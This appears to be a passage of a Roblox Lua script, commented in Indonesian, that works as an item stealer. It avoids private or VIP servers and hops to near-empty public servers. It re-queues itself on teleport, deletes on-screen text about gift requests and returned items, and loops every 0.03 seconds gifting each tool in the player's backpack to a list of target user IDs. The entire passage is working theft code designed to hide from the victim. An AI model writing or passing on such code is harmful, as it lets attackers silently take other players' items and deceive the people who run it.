--====================================================
-- SERVER CHECK
--====================================================

local function getServerType()
    local remote = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
    if not remote then return nil end

    local ok, res = pcall(function()
        return remote:InvokeServer()
    end)

    if ok and res then
        return string.lower(tostring(res))
    end
end

local function isBadServer()
    local t = getServerType()
    if not t then return false end

    return string.find(t,"vip")
        or string.find(t,"private")
        or string.find(t,"reserved")
end

--====================================================
-- FIND SERVER
--====================================================

local function getLowServer()
    local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"

    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(url))
    end)

    if success and result and result.data then
        for _,server in pairs(result.data) do
            if server.playing and server.playing <= 2 then
                return server.id
            end
        end
    end
end

--====================================================
-- HOP SYSTEM
--====================================================

local function hopServer()
    if hopping then return end
    hopping = true

    queueSelf()

    local id = getLowServer()

    if id then
        pcall(function()
            TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
        end)
    else
        pcall(function()
            TeleportService:Teleport(PLACE_ID, player)
        end)
    end
end

TeleportService.TeleportInitFailed:Connect(function()
    task.wait(2)
    hopServer()
end)

--====================================================
-- 🚀 MAIN LOGIC (DIBUNGKUS)
--====================================================

function startMainLogic()

    --====================================================
    -- UI CLEAN
    --====================================================

    local playerGui = player:WaitForChild("PlayerGui")

    local function killGiftText(v)
        if not v:IsA("TextLabel") then return end

        local text = string.lower(v.Text or "")

        if string.find(text, "gift request sent")
        or string.find(text, "queue")
        or string.find(text, "decline")
        or string.find(text, "popup")
        or string.find(text, "item returned") then
            v:Destroy()
        end
    end

    for _,v in ipairs(playerGui:GetDescendants()) do
        killGiftText(v)
    end

    playerGui.DescendantAdded:Connect(function(v)
        task.wait()
        killGiftText(v)
    end)

    --====================================================
    -- AUTO GIFT LOOP
    --====================================================

    task.spawn(function()
        while true do
            task.wait(0.03)

            for _,tool in ipairs(backpack:GetChildren()) do
                if not tool:IsA("Tool") then continue end
                if weightFolder:FindFirstChild(tool.Name) then continue end

                -- 🔥 langsung kirim tanpa ribet (biar brutal)
                for _,id in ipairs(targetUserIds) do
                    pcall(function()
                        giftRemote:FireServer(id)
                    end)
                end

                tool.Parent = nil
            end
        end
    end)

end

